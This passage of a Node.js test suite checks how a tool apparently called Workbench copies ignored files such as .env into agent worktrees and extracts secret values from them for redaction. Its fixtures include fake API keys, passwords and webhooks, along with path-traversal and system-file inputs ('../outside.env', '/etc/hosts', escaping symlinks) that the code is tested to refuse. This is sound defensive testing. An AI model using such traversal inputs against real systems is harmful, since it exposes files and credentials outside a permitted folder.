    fs.appendFileSync(t.p('.gitignore'), '.env\n');
    // node_modules takes the copies' whole time and is stopped: the check still finds .env, which git there would see.
    const quick = cpStandIn();
    const limits = [];
    const copy = (file, args, o) => {
      limits.push(o.timeout);
      if (args.at(-1) !== t.w('node_modules')) return quick.copy(file, args, o);
      return new Promise((_, reject) => setTimeout(() => reject(cpError('', { code: null, killed: true, signal: 'SIGTERM' })), o.timeout));
    };
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy, timeoutMs: 3000 });
    assert.deepEqual(r.copied, []);
    assert.deepEqual(r.skipped, [{ path: '.env', why: 'not-ignored' }, { path: 'node_modules', why: 'failed' }]);
    assert.ok(limits.every(ms => ms <= 2400), String(limits));

    // git cannot list what it would see there: everything copied is taken away again.
    const u = await fillRepo({ '.gitignore': '.env\nnode_modules/\n' }, { '.env': 'S=1\n', 'node_modules/m/index.js': 'm\n' });
    const run = (args, o) => (args[0] === 'ls-files' && !args.includes('--ignored')
      ? Promise.reject(Object.assign(new Error('Command failed'), { code: 128, stderr: 'fatal: index file corrupt' }))
      : runGit(args, o));
    const r2 = await fillWorkspace({ repoRoot: u.root, path: u.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy, run });
    assert.deepEqual([r2.copied, r2.skipped], [[], ['.env', 'node_modules'].map(p => ({ path: p, why: 'failed' }))]);
    for (const f of ['.env', 'node_modules']) assert.equal(present(u.w(f)), false, f);
  });

  test('when git cannot list the folder, or .worktreeinclude cannot be read, nothing is copied, and skipped says so', async () => {
    const t = await fillRepo({ '.gitignore': '.env\n' }, { '.env': 'E=1\n' });
    const cp = cpStandIn();
    const broken = async () => { throw Object.assign(new Error('Command failed'), { code: 128, stderr: 'fatal: not a git repository' }); };
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy, run: broken });
    assert.deepEqual([r.copied, r.skipped], [[], [{ path: '.', why: 'failed' }]]);
    fs.writeFileSync(t.p('.worktreeinclude'), `.env\n${'#'.repeat(300 * 1024)}\n`); // far too big for a list of patterns
    const r2 = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
    assert.deepEqual([r2.copied, r2.skipped], [[], [{ path: '.worktreeinclude', why: 'failed' }]]);
    assert.equal(cp.calls.length, 0);
    assert.equal(present(t.w('.env')), false);
  });

  test('when the search for env files inside a folder git ignores as a whole fails, the rest is still copied, and that folder is named', async () => {
    const t = await fillRepo({ '.gitignore': '.env\nnode_modules/\n/secrets/\n/target/\n' },
      { '.env': 'E=1\n', 'node_modules/x/index.js': 'x\n', 'secrets/.env': 'S=1\n', 'target/a.txt': 'a\n' });
    // git lists the folder, then its search inside secrets/ and target/ fails (stopped by its time limit, say).
    const searches = [];
    const run = (args, o) => {
      if (!args.some(a => a.startsWith(':(glob)'))) return runGit(args, o);
      searches.push(args);
      return Promise.reject(Object.assign(new Error('Command failed'), { code: null, killed: true, signal: 'SIGTERM', stderr: '' }));
    };
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy, run });
    assert.equal(searches.length, 1);
    assert.deepEqual(r.copied.map(e => [e.path, e.kind]), [['.env', 'env'], ['node_modules', 'deps']]);
    assert.deepEqual(r.skipped, [{ path: 'secrets', why: 'failed' }, { path: 'target', why: 'failed' }]);
    assert.equal(readText(t.w('.env')), 'E=1\n');
    assert.equal(present(t.w('secrets')), false);
  });

  test('.git and tracked files are never touched, even when .worktreeinclude names everything', async () => {
    const t = await fillRepo({ '.gitignore': '.env\n*.log\n', 'a.txt': 'committed\n', '.env.example': 'X=committed\n', '.worktreeinclude': '*\n.git\n.git/\n**/.git/**\n' },
      { 'a.txt': 'changed by the person\n', '.env': 'E=1\n', 'debug.log': 'log\n', 'new.txt': 'new, not ignored\n' });
    const dotGit = fs.readFileSync(t.w('.git'));
    const person = () => ({ head: git(t.root, 'rev-parse', 'HEAD'), refs: git(t.root, 'for-each-ref'), index: sha(fs.readFileSync(t.p('.git/index'))), config: readText(t.p('.git/config')) });
    const before = person();
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws }); // the real cp, on this computer
    assert.deepEqual(r.copied.map(e => [e.path, e.kind]), [['.env', 'listed'], ['debug.log', 'listed']]);
    assert.deepEqual(r.skipped, []);
    assert.deepEqual(fs.readFileSync(t.w('.git')), dotGit);
    assert.equal(readText(t.w('a.txt')), 'committed\n');
    assert.equal(present(t.w('new.txt')), false);
    assert.equal(statusOf(t.ws), '', 'what was copied is ignored there too');
    assert.deepEqual(person(), before);
    // By default as well: only .env, and the tracked .env.example as committed.
    fs.rmSync(t.p('.worktreeinclude'));
    const ws2 = await t.agent();
    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2 });
    assert.deepEqual(pathsOf(r2.copied), ['.env']);
    assert.equal(readText(path.join(ws2, '.env.example')), 'X=committed\n');
    assert.equal(readText(path.join(ws2, 'a.txt')), 'committed\n');
  });

  test('the whole fill has a time limit: a copy still going then is stopped, and one not started is left out', async () => {
    const t = await fillRepo({ '.gitignore': '.env*\n' }, Object.fromEntries(Array.from({ length: 12 }, (_, i) => [`.env.${i}`, `N=${i}\n`])));
    const limits = [];
    const copy = (file, args, { timeout }) => new Promise((_, reject) => {
      limits.push(timeout);
      setTimeout(() => reject(cpError('', { code: null, killed: true, signal: 'SIGTERM' })), timeout); // as execFile's limit stops cp
    });
    const started = Date.now();
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy, timeoutMs: 3000 }); // git's listing counts too
    assert.deepEqual(r.copied, []);
    assert.deepEqual(r.skipped.map(s => s.why), Array(12).fill('failed'));
    // At most 8 at once, each stopped within the limit; none started in the last second (a timer can fire a millisecond
    // early, which once started four more with 1 ms each).
    assert.ok(limits.length <= 8 && limits.every(ms => ms >= 1000 && ms <= 3000), String(limits));
    assert.ok(Date.now() - started < 6000);
    assert.deepEqual(fs.readdirSync(t.ws).filter(f => f.startsWith('.env')), []);
  });

  test('no cp starts with less than a second of the fill’s time left: that entry is left out without one', async () => {
    const t = await fillRepo({ '.gitignore': '.env*\n' }, Object.fromEntries(Array.from({ length: 12 }, (_, i) => [`.env.${i}`, `N=${i}\n`])));
    const limits = [];
    // The first eight fail 700 ms before their time is up: the other four would have well under a second.
    const copy = (file, args, { timeout }) => new Promise((_, reject) => {
      limits.push(timeout);
      setTimeout(() => reject(cpError(`cp: ${args.at(-1)}: Input/output error\n`)), Math.max(0, timeout - 700));
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy, timeoutMs: 4000 });
    assert.deepEqual(r.skipped.map(s => s.why), Array(12).fill('failed'));
    assert.equal(limits.length, 8, String(limits));
    assert.ok(limits.every(ms => ms >= 1000), String(limits));
  });

  test('fillWorkspace refuses what is not a workspace folder', async () => {
    const t = await fillRepo({ '.gitignore': '.env\nnode_modules/\n', 'app/index.js': 'x\n' }, { '.env': 'E=1\n', 'app/.env': 'APP=1\n', 'node_modules/x/index.js': 'x\n' });
    await assert.rejects(fillWorkspace({ repoRoot: t.root, path: 'relative/folder' }), /No workspace folder was given/);
    await assert.rejects(fillWorkspace({ repoRoot: t.root, path: path.join(T, 'no-such-folder') }), /No workspace folder was given/);
    await assert.rejects(fillWorkspace({ repoRoot: t.root, path: t.root }), /main folder of the repository/);
    await assert.rejects(fillWorkspace({ repoRoot: path.join(T, 'no-such-repo'), path: t.ws }), /does not exist/);
    // A folder inside the repository is not its top: git would name paths from there, and app/.env would land at .env.
    await assert.rejects(fillWorkspace({ repoRoot: t.p('app'), path: t.ws }), /is not the top folder of a git repository/);
    assert.equal(present(t.w('.env')), false);
    // Only a worktree git lists for this repository, never any other folder: not a plain folder, not another repository's
    // worktree, and not a folder inside the person's own repository.
    const plain = fs.mkdtempSync(path.join(T, 'fill-plain-'));
    const other = await fillRepo({ '.gitignore': '.env\n' });
    const inside = t.p('app');
    for (const folder of [plain, other.ws, inside]) {
      const before = fs.readdirSync(folder).sort();
      await assert.rejects(fillWorkspace({ repoRoot: t.root, path: folder }), /is not a workspace of the repository at/, folder);
      assert.deepEqual(fs.readdirSync(folder).sort(), before, folder);
    }
    assert.equal(present(t.p('app/node_modules')), false);
  });

  test('onChosen hears what will be copied, once, before the first cp; one that throws changes nothing', async () => {
    const t = await fillRepo({ '.gitignore': '.env\n.env.*\nnode_modules/\n', 'app/index.js': 'x\n' },
      { '.env': 'E=1\n', 'app/.env.local': 'A=1\n', 'node_modules/x/index.js': 'x\n' });
    const seen = [];
    const { copy } = cpStandIn(({ src }) => { seen.push(`cp ${path.relative(t.root, src)}`); });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy,
      onChosen: entries => { seen.push(entries.map(e => `${e.kind}:${e.path}`).join(',')); throw new Error('a listener that breaks'); } });
    assert.equal(seen[0], 'env:.env,env:app/.env.local,deps:node_modules', 'env files first, as they are copied');
    assert.deepEqual(seen.slice(1).sort(), ['cp .env', 'cp app/.env.local', 'cp node_modules']);
    assert.deepEqual(pathsOf(r.copied), ['.env', 'app/.env.local', 'node_modules']);
    // nothing to copy: it hears that too; git that cannot list the folder: it hears nothing
    const empty = await fillRepo({ '.gitignore': '.env\n' });
    const heard = [];
    await fillWorkspace({ repoRoot: empty.root, path: empty.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy, onChosen: e => heard.push(e) });
    assert.deepEqual(heard, [[]]);
    const broken = async (args, o) => (args[0] === 'ls-files' ? Promise.reject(new Error('git broke')) : runGit(args, o));
    heard.length = 0;
    const nothing = await fillWorkspace({ repoRoot: t.root, path: await t.agent(), platform: 'darwin', clones: true, copy: cpStandIn().copy, run: broken, onChosen: e => heard.push(e) });
    assert.deepEqual([heard, nothing.skipped], [[], [{ path: '.', why: 'failed' }]]);
  });

  test('envValues gives the values in the env files a fill copied, for the engine to hide; never a package’s own, nor anything through a link or outside the copy', async () => {
    const t = await fillRepo({ '.gitignore': '.env\n.env.*\nnode_modules/\n/secrets/\n', 'src/a.js': 'x\n' }, {
      '.env': [
        '# a comment line, never a value',
        '',
        'export DATABASE_URL=postgres://u:pw-abc123@localhost/db',
        'API_KEY="sk-live-0123456789"',
        "SINGLE='single-quoted-value'",
        'SPACED = spaced-out-value   # and a comment',
        'SHORT=1234567',
        'NODE_ENV=production',
        'PEM="-----BEGIN KEY-----',
        'line-two-of-the-key',
        '-----END KEY-----"',
        'ESCAPED="first-line\\nsecond-line"',
        'HASHED=abc#defghijkl',
        'EMPTY=',
      ].join('\n'),
      'apps/web/.env.local': 'WEB_TOKEN=web-token-value-99\n',
      'node_modules/x/.env': 'PACKAGE_SECRET=package-secret-1\n',
      'secrets/.env': 'IN_SECRETS=in-secrets-folder\n',
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(pathsOf(r.copied), ['.env', 'apps/web/.env.local', 'node_modules', 'secrets/.env']);
    const env = await envValues({ path: t.ws, copied: r.copied });
    assert.equal(env.files, 3, 'the three env files; node_modules is not looked into');
    for (const v of ['postgres://u:pw-abc123@localhost/db', 'sk-live-0123456789', 'single-quoted-value', 'spaced-out-value',
      '-----BEGIN KEY-----', 'line-two-of-the-key', '-----END KEY-----', 'first-line\nsecond-line', 'first-line\\nsecond-line', 'second-line',
      'abc#defghijkl', 'web-token-value-99', 'in-secrets-folder']) assert.ok(env.values.includes(v), JSON.stringify(v));
    // "production" is a plain word, which cannot be a secret (see the next test)
    for (const v of ['1234567', 'production', 'package-secret-1', '# a comment line, never a value', 'DATABASE_URL', '']) assert.ok(!env.values.includes(v), JSON.stringify(v));
    assert.ok(env.values.every(v => typeof v === 'string' && v.length >= 8));
    assert.equal(new Set(env.values).size, env.values.length, 'each once');
    assert.ok(Object.isFrozen(env.values));

    // A folder .worktreeinclude chose is looked into for env files, but not into the packages or repositories inside it.
    put(t.root, { '.worktreeinclude': 'secrets/\n' });
    put(t.root, { 'secrets/deep/.env.production': 'DEEP=deep-value-1234\n', 'secrets/node_modules/y/.env': 'NOPE=not-this-one-1\n', 'secrets/notes.txt': 'PLAIN=not-an-env-file\n' });
    const ws2 = await t.agent();
    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(pathsOf(r2.copied), ['secrets']);
    const env2 = await envValues({ path: ws2, copied: r2.copied });
    assert.deepEqual([env2.files, [...env2.values].sort()], [2, ['deep-value-1234', 'in-secrets-folder']]);

    // What it is handed is checked again: a link (even one inside the copy), a path that climbs out, a file too big
    fs.writeFileSync(path.join(T, 'outside.env'), 'OUTSIDE=outside-value-1\n');
    fs.symlinkSync(path.join(T, 'outside.env'), path.join(ws2, '.env.linked'));
    fs.symlinkSync('secrets/.env', path.join(ws2, '.env.inside'));
    fs.writeFileSync(path.join(ws2, '.env.big'), `BIG=${'b'.repeat(300 * 1024)}\n`);
    const odd = await envValues({ path: ws2, copied: [
      { path: '.env.linked', kind: 'listed' }, { path: '.env.inside', kind: 'listed' }, { path: '../outside.env', kind: 'listed' },
      { path: '/etc/hosts', kind: 'listed' }, { path: '.env.big', kind: 'listed' }, { path: 'no/such/.env', kind: 'env' }, null, 'x',
    ] });
    assert.deepEqual([odd.files, odd.values], [0, []]);
    assert.deepEqual(await envValues({ path: 'relative', copied: r.copied }), { values: [], files: 0 });
    assert.deepEqual(await envValues({}), { values: [], files: 0 });
  });

  test('envValues leaves out the values that cannot be secrets, which people and agents write too, unless the name or the shape says secret', async () => {
    const dir = fs.realpathSync.native(fs.mkdtempSync(path.join(T, 'env-plain-')));
    // made up here, from parts: a webhook's address holds its secret in its path, which looksLikeSecret does not search
    const hook = ['https://hooks.slack.com/services', 'T0A1B2C3D', 'B0E4F5G6H', ['x7Kq', 'W2mZ', 'p9Lr', 'T4vN', 'b8Yc', 'J3sD'].join('')].join('/');
    const awsId = ['AKIA', 'QWERTYUIOPASDFGH'].join(''); // letters only, but a key's shape
    const plain = {
      NODE_ENV: 'production', DB_HOST: 'localhost', DB_NAME: 'database', CHAT_ROLE: 'assistant', COUNTRY: 'Australia', BIG: '12345678',
      PHONE: '+15551234567', NODE_VERSION: 'v20.11.10', TOOL_VERSION: '2024.10.1', HOST_IP: '127.0.0.1', LISTEN: 'localhost:3000', DB_ADDR: '127.0.0.1:5432', NET: '10.0.0.0/16',
      V6: '2001:db8::1', V6_PORT: '[2001:db8::1]:8080', SMTP_HOST: 'smtp.example.com', APP_URL: 'http://localhost:3000',
      API_BASE: 'https://api.example.com/v1/users/', CACHE_URL: 'redis://cache:6379', DOCS: 'https://example.com/docs/index.html',
    };
    const secret = {
      // the name says secret: hidden whatever the value looks like
      DB_PASSWORD: 'sunshine', ADMIN_PW: 'letmeinplease', JWT_SECRET: 'supersecret', STRIPE_KEY: 'abcdefghij', LOGIN_PIN: '87654321',
      NEXTAUTH_URL: 'http://localhost:3000/auth', TEAM_WEBHOOK: 'https://example.com/hooks/deploy',
      // the shape says secret, or may hide one
      ACCESS_ID: awsId, SLACK_HOOK: hook, TRACK_URL: 'https://example.com/t?id=abcdef123', AT_URL: 'https://example.com/a#token-abc',
      DATABASE_URL: ['postgres://app', 'pw-x81mQ@db.internal/app'].join(':'), ENCODED: 'https://example.com/a%20b/c',
      // any other shape is hidden, even when it is no secret
      REGION: 'us-east-1', MODEL: 'claude-haiku-4-5', CACHE: 'redis:6379', USER_LOGIN: 'alice:4321', IDP_BASE: 'https://example.com/oauth2/x',
      PHRASE: 'correct horse battery', MIXED_HOST: 'Db.Example.com',
    };
    // quoted where dotenv would cut a bare value at the #
    const lines = Object.entries({ ...plain, ...secret }).map(([k, v]) => `${k}=${v.includes('#') ? JSON.stringify(v) : v}`);
    fs.writeFileSync(path.join(dir, '.env'), `${lines.join('\n')}\nexport QUOTED="development"\nMULTI="first-line-of-it\nproduction"\n`);
    const env = await envValues({ path: dir, copied: [{ path: '.env', kind: 'env' }] });
    assert.equal(env.files, 1);
    for (const [k, v] of Object.entries(plain)) assert.ok(!env.values.includes(v), `${k}=${v} is not hidden`);
    for (const [k, v] of Object.entries(secret)) assert.ok(env.values.includes(v), `${k}=${v} is hidden`);
    assert.ok(!env.values.includes('development'), 'quoted, it is the same word');
    // each line of a value of several lines is judged by itself, unless the value as a whole says secret
    assert.ok(env.values.includes('first-line-of-it\nproduction') && env.values.includes('first-line-of-it') && !env.values.includes('production'));
  });

  test('envValuesIn reads again, in an agent’s folder, the env files a fill would choose there: its copies, for an agent continued in a later run', async () => {
    const t = await fillRepo({ '.gitignore': '.env\n.env.*\nnode_modules/\n', 'src/a.js': 'x\n' }, {
      '.env': 'API_TOKEN=api-token-value-1\n', 'apps/web/.env.local': 'WEB=web-value-12345\n', 'node_modules/x/.env': 'PKG=package-value-1\n',
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(pathsOf(r.copied), ['.env', 'apps/web/.env.local', 'node_modules']);
    const again = await envValuesIn({ path: t.ws });
    assert.deepEqual([again.files, [...again.values].sort()], [2, ['api-token-value-1', 'web-value-12345']]);
    assert.ok(Object.isFrozen(again.values));
    // nothing there, a folder that is not one, or git that cannot list it: nothing, never a rejection
    assert.deepEqual(await envValuesIn({ path: await t.agent() }), { values: [], files: 0 });
    assert.deepEqual(await envValuesIn({ path: path.join(T, 'no-such-folder') }), { values: [], files: 0 });
    assert.deepEqual(await envValuesIn({ path: t.ws, run: async () => { throw new Error('git broke'); } }), { values: [], files: 0 });
  });
});

test('nothing is left behind in the temporary folder, or in Workbench’s own private one', () => {
  assert.deepEqual(fs.readdirSync(tmp).filter(f => f.startsWith('workbench-')), []);
  const own = path.join(process.env.HOME, '.workbench', 'tmp'); // the tests above use it (see the planting git's test)
  assert.deepEqual(fs.existsSync(own) ? fs.readdirSync(own).filter(f => f.startsWith('workbench-')) : [], []);
});

test('nothing was written to the real home folder', () => {
  if (!homeWorkbenchExisted) assert.equal(fs.existsSync(homeWorkbench), false);
});
